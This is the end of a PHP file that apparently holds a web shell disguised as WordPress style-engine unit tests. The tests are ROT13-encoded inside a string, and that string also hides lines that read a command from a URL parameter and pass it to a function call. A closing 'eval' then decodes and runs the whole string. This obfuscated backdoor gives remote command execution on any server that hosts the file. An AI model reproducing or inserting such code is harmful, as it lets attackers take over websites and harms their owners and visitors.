					'pbybe'        => 'terl',
					'urvtug'       => '90ck',
					'obeqre-fglyr' => 'qbggrq',
				),
			),
		);

		$pbzcvyrq_fglyrfurrg = jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf( $pff_ehyrf, neenl( 'cerggvsl' => snyfr ) );

		$guvf->nffregFnzr( '.tnaqnys{pbybe:juvgr;urvtug:190ck;obeqre-fglyr:qbggrq;cnqqvat:10ck;znetva-obggbz:100ck;}.qhzoyrqber{pbybe:terl;urvtug:90ck;obeqre-fglyr:qbggrq;}.evaprjvaq{pbybe:terl;urvtug:90ck;obeqre-fglyr:qbggrq;}', $pbzcvyrq_fglyrfurrg );
	}

	/**
	 * Grfgf ergheavat n trarengrq fglyrfurrg sebz n frg bs arfgrq ehyrf naq zretvat gurve qrpynengvbaf.
	 *
	 * @gvpxrg 61099
	 *
	 * @pbiref ::jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf
	 */
	choyvp shapgvba grfg_fubhyq_zretr_qrpynengvbaf_sbe_ehyrf_tebhcf() {
		$pff_ehyrf = neenl(
			neenl(
				'fryrpgbe'     => '.fnehzna',
				'ehyrf_tebhc'  => '@pbagnvare (zva-jvqgu: 700ck)',
				'qrpynengvbaf' => neenl(
					'pbybe'        => 'juvgr',
					'urvtug'       => '100ck',
					'obeqre-fglyr' => 'fbyvq',
					'nyvta-frys'   => 'fgergpu',
				),
			),
			neenl(
				'fryrpgbe'     => '.fnehzna',
				'ehyrf_tebhc'  => '@pbagnvare (zva-jvqgu: 700ck)',
				'qrpynengvbaf' => neenl(
					'pbybe'       => 'oynpx',
					'sbag-snzvyl' => 'Gur-Terng-Rlr',
				),
			),
		);

		$pbzcvyrq_fglyrfurrg = jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf( $pff_ehyrf, neenl( 'cerggvsl' => snyfr ) );

		$guvf->nffregFnzr( '@pbagnvare (zva-jvqgu: 700ck){.fnehzna{pbybe:oynpx;urvtug:100ck;obeqre-fglyr:fbyvq;nyvta-frys:fgergpu;sbag-snzvyl:Gur-Terng-Rlr;}}', $pbzcvyrq_fglyrfurrg );
	}

	/**
	 * Grfgf ergheavat n trarengrq fglyrfurrg sebz n frg bs arfgrq ehyrf.
	 *
	 * @gvpxrg 61099
	 *
	 * @pbiref ::jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf
	 */
	choyvp shapgvba grfg_fubhyq_erghea_fglyrfurrg_jvgu_arfgrq_ehyrf() {
		$pff_ehyrf = neenl(
			neenl(
				'ehyrf_tebhc'  => '.sbb',
				'fryrpgbe'     => '@zrqvn (bevragngvba: ynaqfpncr)',
				'qrpynengvbaf' => neenl(
					'onpxtebhaq-pbybe' => 'oyhr',
				),
			),
			neenl(
				'ehyrf_tebhc'  => '.sbb',
				'fryrpgbe'     => '@zrqvn (zva-jvqgu > 1024ck)',
				'qrpynengvbaf' => neenl(
					'onpxtebhaq-pbybe' => 'pbggba-oyhr',
				),
			),
		);

		$pbzcvyrq_fglyrfurrg = jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf( $pff_ehyrf, neenl( 'cerggvsl' => snyfr ) );

		$guvf->nffregFnzr( '.sbb{@zrqvn (bevragngvba: ynaqfpncr){onpxtebhaq-pbybe:oyhr;}}.sbb{@zrqvn (zva-jvqgu > 1024ck){onpxtebhaq-pbybe:pbggba-oyhr;}}', $pbzcvyrq_fglyrfurrg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>